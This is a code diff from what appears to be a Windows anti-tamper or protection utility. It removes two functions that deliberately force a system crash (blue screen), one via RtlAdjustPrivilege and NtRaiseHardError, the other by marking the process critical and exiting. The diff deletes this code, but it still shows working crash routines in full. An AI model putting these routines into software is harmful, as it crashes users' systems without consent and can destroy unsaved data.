@@ -177,28 +177,6 @@ namespace BasicUtils
         return ERROR_SUCCESS;
     }
 
-    void __declspec(noinline) manual_load_ntdll_and_bsod()
-    {
-        auto ntdll = GetModuleHandleA("ntdll.dll");
-        char path[MAX_PATH] = { 0 };
-        GetModuleFileNameA(ntdll, path, sizeof(path));
-        std::ifstream file(path, std::ios::in | std::ios::binary);
-        std::stringstream ss;
-        ss << file.rdbuf();
-        auto buf = std::move(ss.str());
-        HINSTANCE ntdll_wrapper = ntdll;
-        manual_load_ntdll(buf.data(), buf.size(), &ntdll_wrapper);
-        auto RtlAdjustPrivilege = IMPORT(L"ntdll.dll", RtlAdjustPrivilege);
-        auto NtRaiseHardError = IMPORT(L"ntdll.dll", NtRaiseHardError);
-        RtlAdjustPrivilege = ApiResolver::rebase<decltype(RtlAdjustPrivilege)>(RtlAdjustPrivilege, (void*)ntdll, ntdll_wrapper);
-        NtRaiseHardError = ApiResolver::rebase<decltype(NtRaiseHardError)>(NtRaiseHardError, (void*)ntdll, ntdll_wrapper);
-        BOOLEAN was_enabled = 0;
-        ULONG response = 0;
-        RtlAdjustPrivilege(0x13, TRUE, FALSE, &was_enabled);
-        NtRaiseHardError(0xC000021A, 4, 1, NULL, 6, &response);
-        VirtualFree(ntdll_wrapper, 0, MEM_RELEASE);
-    }
-
     static WNDPROC old_wnd_proc = NULL;
     WNDPROC set_old_wnd_proc(WNDPROC routine)
     {
@@ -236,18 +214,6 @@ namespace BasicUtils
             SetWindowLongA(hwnd, GWLP_WNDPROC, (LONG)&wnd_proc_wrapper);
         }
         VMP_VIRTUALIZATION_END()
-    }
-
-    void __declspec(noinline) bsod()
-    {
-        HANDLE ntdll = LoadLibrary(TEXT("ntdll.dll"));
-        auto RtlAdjustPrivilege = IMPORT(L"ntdll.dll", RtlAdjustPrivilege);
-        auto RtlSetProcessIsCritical = IMPORT(L"ntdll.dll", RtlSetProcessIsCritical);
-        BOOLEAN b;
-        RtlAdjustPrivilege(20UL, TRUE, FALSE, &b);
-        RtlSetProcessIsCritical(TRUE, NULL, FALSE);
-        auto ExitProcess = IMPORT(L"kernel32.dll", ExitProcess);
-        ExitProcess(0);
     }
 
     std::tuple<std::string, std::string> scan_tcp_table(std::vector<std::tuple<std::string, std::string>> black_ip_table)
